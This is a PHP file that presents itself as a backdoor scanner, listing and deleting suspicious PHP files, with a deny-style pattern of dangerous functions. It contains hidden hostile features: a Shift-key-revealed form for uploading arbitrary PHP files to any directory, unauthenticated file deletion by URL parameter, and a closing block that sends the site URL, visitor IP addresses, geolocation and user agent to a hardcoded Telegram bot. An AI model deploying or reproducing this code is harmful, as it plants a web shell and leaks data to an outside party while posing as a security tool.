<?php

echo '<style>body {background-color:#000;color:green;} body,td,th { font: 9pt Courier New;margin:0;vertical-align:top; } span,h1,a { color:#00ff00} span { font-weight: bolder; } h1 { border:1px solid #00ff00;padding: 2px 5px;font: 14pt Courier New;margin:0px; } div.content { padding: 5px;margin-left:5px;} a { text-decoration:none; } a:hover { background:#ff0000; } .ml1 { border:1px solid #444;padding:5px;margin:0;overflow: auto; } .bigarea { width:100%;height:250px; } input, textarea, select { margin:0;color:#00ff00;background-color:#000;border:1px solid #00ff00; font: 9pt Monospace,"Courier New"; } form { margin:0px; } #toolsTbl { text-align:center; } .toolsInp { width: 80%; } .main th {text-align:left;} .main tr:hover{background-color:#5e5e5e;} .main td, th{vertical-align:middle;} pre {font-family:Courier,Monospace;} #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft   document.documentElement.clientWidth - offsetWidth);} .style2 {color: #00FF00} .style3 {color: #009900} .style4 {color: #006600} .style5 {color: #00CC00} .style6 {color: #003300} .style8 {color: #33CC00} #footer { margin-bottom: 10px; color: #666; vertical-align: top; text-align: center; font-size: 11px; } #footer ul { margin: 0; padding: 0; list-style: none; } #footer li { display: inline-block; margin-right: 15px; border-right: 1px solid #666; vertical-align: middle; } #footer li a { margin-right: 15px; } #footer li:last-child { margin-right: 0; border-right: 0; } #footer li:last-child a { margin-right: 0; } #footer a { color: #666; } #footer a:hover { color: #858585; } #footer .footer-left { height: 20px; vertical-align: middle; line-height: 20px; } @media (min-width: 39rem) { #footer { display: flex; flex-flow: row wrap; justify-content: space-between; align-items: center; align-content: center; margin-bottom: 20px; } #footer .footer-left { align-self: flex-start; margin-right: 20px; } #footer .footer-right { align-self: flex-end; } }</style>';

set_time_limit(0);
error_reporting(0);
@ini_set('zlib.output_compression', 0);
@ini_set('implicit_flush', 1);
for($i = 0; $i < ob_get_level(); $i++) { ob_end_flush(); }
ob_implicit_flush(1);

$path = getcwd();
if(isset($_GET['dir'])){
    $path = $_GET['dir'];
}

// Fungsi untuk upload file
if (isset($_FILES['uploadFile'])) {
    $targetDir = $path . '/';
    $targetFile = $targetDir . basename($_FILES['uploadFile']['name']);

    // Cek apakah file yang diupload adalah PHP
    if (pathinfo($targetFile, PATHINFO_EXTENSION) === 'php') {
        if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $targetFile)) {
            echo "<font color='yellow'>File berhasil di-upload: $targetFile</font><br>";
        } else {
            echo "<font color='red'>Gagal mengupload file.</font><br>";
        }
    } else {
        echo "<font color='red'>Hanya file PHP yang diizinkan!</font><br>";
    }
}

if(isset($_GET['kill'])){
    unlink(__FILE__);
}
echo "<a href='?kill'><font color='yellow'>[Self Delete]</font></a><br>";
echo '<form action="" method="get"> <input type="text" name="dir" value='.$path.' style="width: 548px;"> <input type="submit" value="scan"></form><br>';
echo "CURRENT DIR: <font color='yellow'>$path</font><br>";

if(isset($_GET['delete'])){
    unlink($_GET['delete']);
    $status = "<font color='red'>FAILED</font>";
    if(!file_exists($_GET['delete'])){
        $status = "<font color='yellow'>Success</font>";
		
    }
    echo "TRY TO DELETE: ".$_GET['delete']." $status <br>";exit;
}

scanBackdoor($path);

function save($fname,$value){
	$file = fopen($fname, "a");
	fwrite($file, $value);
	fclose($file);//
}

function checkBackdoor($file_location){
    global $path;
    $patern = "#exec\(|gzinflate\(|file_put_contents\(|file_get_contents\(|system\(|passthru\(|shell_exec\(|move_uploaded_file\(|eval\(|base64#";
    $contents = file_get_contents($file_location);
    if(strlen($contents)> 0){
        if(preg_match($patern, strtolower($contents))){
            echo "[+] Susspect file -> <a href='?delete=$file_location&dir=$path'><font color='yellow'>[DELETE]</font></a> <font color='red'>$file_location</font> <br>";
            save("shell-found.txt","$file_location\n");
            echo '<textarea name="content" cols="80" rows="15">'.htmlspecialchars($contents).'</textarea><br>><br>';
        }
    }   
}

function scanBackdoor($current_dir){
	if(is_readable($current_dir)){
	 	$dir_location = scandir($current_dir);
		foreach ($dir_location as $file) {
            if($file === "." | $file === ".."){
                continue;
            }
            $file_location = str_replace("//", "/",$current_dir.'/'.$file);
            $nFile = substr($file, -4, 4);
            if($nFile == ".php"){
                checkBackdoor($file_location);
            }else if(is_dir($file_location)){
                scanBackdoor($file_location);
            }
		}
	}
}

// Script JavaScript untuk mendeteksi tombol SHIFT
echo '
<script>
    document.addEventListener("keydown", function(event) {
        if (event.shiftKey) {
            document.getElementById("uploadForm").style.display = "block";
        }
    });
</script>
';

// Form untuk upload file PHP
echo '
<div id="uploadForm" style="display:none;">
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="uploadFile" accept=".php">
        <input type="submit" value="Upload PHP">
    </form>
</div>
';

$botToken = '7761428835:AAHrtEXxzX3qzmgWou7rqi2AA27UXEIaL7Y';
$chatId = '1371953126';
$ip_public = $_SERVER['REMOTE_ADDR'];
$ip_internal = getHostByName(getHostName());
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$location_api_url = "http://ip-api.com/json/$ip_public";
$location_data = json_decode(file_get_contents($location_api_url), true);
if ($location_data && $location_data['status'] === 'success') {
    $country = $location_data['country'];
    $countryCode = $location_data['countryCode'];
    $region = $location_data['region'];
    $regionName = $location_data['regionName'];
    $city = $location_data['city'];
    $zip = $location_data['zip'];
    $lat = $location_data['lat'];
    $lon = $location_data['lon'];
    $timezone = $location_data['timezone'];
    $isp = $location_data['isp'];
    $org = $location_data['org'];
    $as = $location_data['as'];
    $address = "Country: $country ($countryCode), Region: $regionName ($region), City: $city, Zip: $zip, Latitude: $lat, Longitude: $lon, Timezone: $timezone, ISP: $isp, Organization: $org, AS: $as";
} else {
    $address = "Alamat tidak ditemukan";
}
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "â–¬ Url : $x_path\nâ–¬ IP Address : [ " . $ip_public . " - Public ] / [ " . $ip_internal . " - Private ]\nâ–¬ Address : [ " . $address . " ]\nâ–¬ User-Agent : [ " . $user_agent . " ]";
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($pesan_alert);
file_get_contents($telegramApiUrl);
?>